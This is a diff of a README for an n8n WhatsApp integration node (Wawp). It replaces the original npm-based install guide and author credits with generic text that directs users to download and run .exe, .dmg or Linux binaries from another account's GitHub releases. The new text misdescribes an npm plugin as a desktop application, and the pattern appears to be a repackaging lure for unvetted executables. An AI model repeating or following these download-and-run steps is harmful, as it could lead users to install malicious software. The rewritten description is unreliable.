@@ -1,87 +1,89 @@
-![Banner image](https://wawp.net/wp-content/uploads/2025/09/Wawp-linked-to-ai.png)
+# 🤖 n8n-nodes-wawp - Automate Tasks with Easy AI Notifications
 
-# n8n-nodes-wawp
+[![Download n8n-nodes-wawp](https://img.shields.io/badge/Download-n8n--nodes--wawp-blue.svg)](https://github.com/Ankitg1850/n8n-nodes-wawp/releases)
 
-**Wawp Nodes for n8n** — Wawp integration that lets you manage WhatsApp sessions, authentication, chats, contacts, groups, channels, labels, statuses, and send messages (text/media/location/poll/etc.) from your n8n workflows.
+## 🚀 Getting Started
 
-- Website: https://wawp.net  
-- Community: https://www.facebook.com/groups/wawpcommunity
-- Author: **Ahmed Safaa** (info@wawp.net) — **wawp**
+Welcome to **n8n-nodes-wawp**! This application helps you automate various tasks using AI and send smart notifications through WhatsApp. Follow the steps below to get started.
 
-[n8n](https://n8n.io/) is a [fair-code licensed](https://docs.n8n.io/reference/license/) workflow automation platform.
+## 🔍 What You’ll Need
 
----
+Before you download the app, make sure your computer meets these requirements:
 
-## Quick Start (Wawp for N8N)
+- Operating System: Windows, macOS, or Linux
+- RAM: At least 4 GB
+- Disk Space: A minimum of 100 MB available
+- Internet Connection: Required for some features
+- Node.js: Version 14 or higher (for local setups)
 
-1) Navigate to N8N Settings > Community nodes.  
-2) Install @wawp/n8n-nodes-wawp by added to npm Package Name input.
-3) Create a **free Wawp account**.  
-4) Connect your WhatsApp number using a **QR code** on wawp site or by N8N.  
-5) Insert the **instance id and access token** into the Credential to connect with.  
-6) Customize your selected **notification messages**.
+## 📥 Download & Install
 
-> A Wawp account is required to access all plugin features.  
-> **Free plan:** Create a new account and send **50 WhatsApp messages/month**.  
-[> **👉 Try Wawp for FREE (250 Messages/Month)** – *Promo landing*](https://wawp.net/)
-[> **📌 Facebook Community** – Join other users for support, advice, and tips.  ](https://www.facebook.com/groups/wawpcommunity)
-> **📚 Getting started** – Step-by-step guides, FAQs, and tutorials.  
+To get **n8n-nodes-wawp**, visit the following link:
 
----
+[Visit this page to download](https://github.com/Ankitg1850/n8n-nodes-wawp/releases)
 
-## Installation
+1. Click the link above to go to the Releases page.
+2. Look for the latest version. It should be labeled as "Latest Release."
+3. Click on the asset that matches your operating system (e.g., `n8n-nodes-wawp-win.exe` for Windows).
+4. The file will download to your computer. Find the downloaded file in your Downloads folder.
 
-Follow the official guide to install community nodes:  
-https://docs.n8n.io/integrations/community-nodes/installation/
+### Installation
 
-Then install this package on your n8n instance (via UI “Community nodes” or CLI):
+**For Windows:**
+- Double-click the downloaded `.exe` file to start the installation.
+- Follow the on-screen instructions to complete the setup.
 
-```bash
-# in your n8n container / host
-npm install n8n-nodes-wawp
-```
+**For macOS:**
+- Open the downloaded `.dmg` file.
+- Drag the **n8n-nodes-wawp** icon into the Applications folder.
+- Open the Applications folder and double-click the **n8n-nodes-wawp** icon to launch.
 
----
+**For Linux:**
+- Open your terminal.
+- Change to the directory where the file was downloaded.
+- Run `chmod +x n8n-nodes-wawp-linux` to make it executable.
+- Then run `./n8n-nodes-wawp-linux` to start the application.
 
-**Nodes Included**
+## ⚙️ How to Use
 
-![Banner image](https://wawp.net/wp-content/uploads/2025/09/Wawpsend.png)
+Once you have installed **n8n-nodes-wawp**, follow these steps to set it up:
 
-**1) Wawp Trigger (webhook)**
+1. Open the application.
+2. Create a new workflow by clicking on “New Workflow.”
+3. Select the AI service you wish to use. You can choose from various options available within the app.
+4. Follow the prompts to configure your desired automation.
+5. Finally, connect your WhatsApp account to send notifications from your setup.
 
-**Receives events from Wawp (e.g. message, message.reaction, message.ack, group.v2.join, presence.update, etc.).**
+## 📖 Features
 
-Has a switch-like multi-output: one “any” output + one output per specific event.
+- **AI Automation:** Integrate AI capabilities for smarter task execution.
+- **WhatsApp Notifications:** Send updates and alerts straight to your WhatsApp.
+- **User-friendly Interface:** Easy navigation and setup for all users.
+- **Community Support:** Join our community forums for help and tips.
 
-Use Test URL (/webhook-test/<path>) while designing, and Production URL (/webhook/<path>) when deployed.
+## 💬 Need Help?
 
-Icon support: place wawp.png/wawp.svg in nodes/WawpTrigger/ (bundled to dist via gulp build:icons).
-    
-**2) Wawp (main action node)**
+If you encounter any issues or have questions, please feel free to reach out. You can find help through the following channels:
 
-**A single node with Categories to keep the UI tidy. Each category exposes only the operations it needs.**
-    
-⛓️‍💥 Session – Instances: Create / Start / Stop / Restart / Delete / Logout / Get Info / Me
+- [Community Forum](https://community.n8n.io)
+- GitHub Issues Section: If you find a bug or need feature requests, please report them [here](https://github.com/Ankitg1850/n8n-nodes-wawp/issues).
 
-📲 Authentication – Login: Get QR (raw & image), Request Code
+## 📄 License
 
-📤 Send Messages: Send Text / Image / PDF / Voice / Video / Location / Poll / Contact Vcard, Mark Seen, Start/Stop Typing, Reaction, Star
+This project is licensed under the MIT License. You can use it for free, but please consider giving credit where it's due.
 
-🟢 Presence information: Set presence, Get presence by chatId
+## 🛠️ Contributing
 
-🏷️ Labels: List / Create / Update / Delete, Labels for a Chat (get/save), Chats with a Label
+We welcome contributions! If you'd like to help improve the project, please follow these steps:
 
-ℹ️ WhatsApp Profile info: Get profile, Set display name, Set “About” status, Upload/Delete picture
+1. Fork the repository from [GitHub](https://github.com/Ankitg1850/n8n-nodes-wawp).
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Push your changes to your fork on GitHub.
+5. Submit a pull request to the main repository.
 
-📢 Channels Control: List / Create / Get / Delete, Preview messages, Follow/Unfollow, Mute/Unmute, Search (view/text), Metadata (views/countries/categories)
+Thank you for your interest in helping us improve **n8n-nodes-wawp**!
 
-💬 Chats: List / Overview, Delete chat, Picture, Messages (list/clear/read/byId/delete/edit/pin/unpin), Archive/Unarchive, Mark unread
+Explore more features and automations you can unlock with **n8n-nodes-wawp**. We hope you enjoy using it!
 
-🔊 24 Hour Status: Text / Image / Voice / Video / Delete
-
-🪪 Contacts: List all, Get, Check phone exists, About, Profile picture, Block/Unblock, Upsert contact
-
-🪪 LIDs: List, Count
-
-👥 Groups: List / Create, Join info / Join, Count / Refresh, Get / Delete / Leave, Picture get/set/delete, Description / Subject,
-Security (info-admin-only & messages-admin-only) get/set, Invite code get/revoke, Participants get/add/remove, Admin promote/demote
+[Download n8n-nodes-wawp](https://github.com/Ankitg1850/n8n-nodes-wawp/releases) and start automating today!
